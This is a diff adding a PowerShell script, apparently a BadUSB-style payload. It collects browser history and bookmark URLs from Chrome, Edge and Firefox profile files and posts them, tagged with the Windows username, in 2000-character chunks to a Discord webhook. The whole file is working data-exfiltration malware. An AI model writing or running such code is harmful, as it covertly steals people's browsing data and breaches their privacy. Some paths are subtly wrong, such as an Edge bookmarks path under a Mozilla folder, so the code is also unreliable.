@@ -1,0 +1,117 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Update Discord WebHook
+$webhookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_HOOK_URL_HERE"
+
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $webhookUrl
+    }
+}
+
+function Get-BrowserData {
+    [CmdletBinding()]
+    param (    
+        [Parameter(Position=1, Mandatory=$True)]
+        [string]$DataType 
+    ) 
+
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+    # List of supported browsers
+    $SupportedBrowsers = @(
+        'chrome',
+        'edge',
+        'firefox'
+        # Add other supported browsers as needed
+    )
+
+    $ResultArray = @()
+
+    foreach ($Browser in $SupportedBrowsers) {
+        $Path = Get-BrowserPath -Browser $Browser -DataType $DataType
+
+        if ($Path -ne $null) {
+            $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort-Object -Unique
+
+            $Value | ForEach-Object {
+                $ResultArray += New-Object -TypeName PSObject -Property @{
+                    User = $env:UserName
+                    Browser = $Browser
+                    DataType = $DataType
+                    Data = $_
+                }
+            }
+        }
+    }
+
+    return $ResultArray
+}
+
+function Get-BrowserPath {
+    param (
+        [Parameter(Position=1, Mandatory=$True)]
+        [string]$Browser,
+        [Parameter(Position=2, Mandatory=$True)]
+        [string]$DataType
+    )
+
+    switch ($Browser) {
+        'chrome' {
+            if ($DataType -eq 'history') {
+                return "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+            }
+            elseif ($DataType -eq 'bookmarks') {
+                return "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+            }
+        }
+        'edge' {
+            if ($DataType -eq 'history') {
+                return "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+            }
+            elseif ($DataType -eq 'bookmarks') {
+                return "$env:USERPROFILE\AppData\Local\Mozilla\Edge\User Data\Default\Bookmarks"
+            }
+        }
+        'firefox' {
+            if ($DataType -eq 'history') {
+                return "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+            }
+        }
+        # Add additional cases for other browsers as needed
+    }
+
+    Write-Warning "Unsupported browser or data type."
+    return $null
+}
+
+# Fetch browser history and bookmarks
+$allBrowserHistory = Get-BrowserData -DataType 'history' | Out-String
+$allBrowserBookmarks = Get-BrowserData -DataType 'bookmarks' | Out-String
+
+# Concatenate history and bookmarks
+$allBrowserData = "HISTORY:`n`n`n`n`n" + $allBrowserHistory + "BOOKMARKS:`n`n`n`n`n" + $allBrowserBookmarks
+
+# Chunk the message into 2000 characters and upload
+while ($allBrowserData.Length -gt 0) {
+    $chunk = $allBrowserData.Substring(0, [Math]::Min(2000, $allBrowserData.Length))
+    Upload-Discord -text $chunk
+    $allBrowserData = $allBrowserData.Substring([Math]::Min(2000, $allBrowserData.Length))
+}
